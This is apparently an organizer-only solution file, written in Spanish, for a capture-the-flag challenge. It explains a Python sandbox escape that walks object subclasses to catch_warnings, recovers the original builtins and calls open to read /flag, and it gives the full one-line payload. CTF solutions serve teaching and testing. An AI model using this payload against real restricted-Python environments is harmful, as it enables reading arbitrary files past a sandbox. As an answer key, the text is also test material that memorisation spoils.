# Solución (solo organizadores)

No entregues este archivo a participantes antes del reto.

La introspección permite llegar a `object` y recorrer sus subclases. El módulo
`warnings` hace disponible `catch_warnings`; desde su atributo `_module` se
pueden recuperar los builtins originales y llamar a `open`.

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/flag').read()
```

El payload puede depender de la versión y los módulos precargados. Al cambiar
la imagen de Python, valida el reto en un entorno Linux aislado.
